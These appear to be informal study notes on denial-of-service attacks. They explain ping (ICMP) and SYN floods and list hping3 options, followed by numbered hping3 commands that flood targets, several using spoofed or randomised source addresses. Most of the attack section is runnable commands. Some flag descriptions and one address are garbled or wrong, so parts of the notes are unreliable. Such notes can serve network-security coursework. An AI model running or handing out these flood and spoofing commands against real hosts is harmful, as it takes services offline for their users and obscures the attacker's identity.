DENIAL OF SERVICE(DOS) ATTACK:
    A denial of service (DoS) event is a cyber attack in which hackers or
    cybercriminals seek to make a host machine, online service or network resource
    unavailable to its intended users.
    Different types of Denial of Service Attacks: Syn flood, Ping (ICMP) flood, UDP flood, etc.
    
    Ping Flood DOS attack:
        An Internet Control Message Protocol (ICMP) flood attack, also known as a Pingflood attack, 
        is a common Denial-of-Service (DoS) attack in which an attacker attempts to overwhelm a targeted device with ICMP echo-requests (pings).
        Normally, ICMP echo-request and echo-reply messages are used to ping a network device in order to diagnose the health and 
        connectivity of the device and the connection between the sender and the device. 
        By flooding the target with request packets, the network is forced to respond with an equal number of reply packets. 
        This causes the target to become inaccessible to normal traffic.
        
    Syn Flood DOS attack:
        A connection should be established b4 sending packets. TCP 3 way handshake....syn, syn-ack & ack.
        
    Hping3 for performing DOS attack
        -c:count of packets
        -s: sourch ip
        -a: dest ip on which attack will happen
        -i: interval b/tw each ping(in secs)
        -1: One(icmp packet)
        -S: Syn packet
        -d: data size
        -w: set tcp window
   Commands:
   PING FLOOD DOS ATTACK(icmp)
    1.hping3 -s 10.5.7.21 -a 10.9.7.6 -p 135 --flood
    from src to dest on port 135 syn flood is done.
    2.hping3 -1 -c 3 192.168.23.2 
    sends 3 packets...send n revcies reply
    3.hping3 -1 -c 6 -i 5 192.168.217.3
    6 packets will be transmitted after each 5 secs.
    4.hping3 -1 --fast 192.168.0.0
    increasing rate of speed(ping flood attack)
    5.hping -1 --flood 192.168.0.9
    flooding with max no of pings
    6.hping3 -1 -a 192.168.217.2 -c 1 192.168.217.3
    send icmp packet but from fake ip(first ip) to another ip. This is called ip spoofing. No packets r recieved.
    7.hping3 -1 --rand-source -c 1 192.168.217.3
    send packets from random src, we don't khow which. We can send to random destination too.
    
   SYN FLOOD DOS ATTACK(tcp)
    1.hping3 -S -c 1 -p 80 192.168.217.2
    transmit 1 syn packet is being sent to port 80 of this ip.
    2.hping3 -S --flood -p 80 192.16.217.3
    flooding syn packets
    3.hping3 -c 15000 -d 120 -S -w 64 -p 80 --flood --rand-source 192.168.1.159
    flooding ip frm random source with 15000 packets of data size 120 with tcp window set on port 80
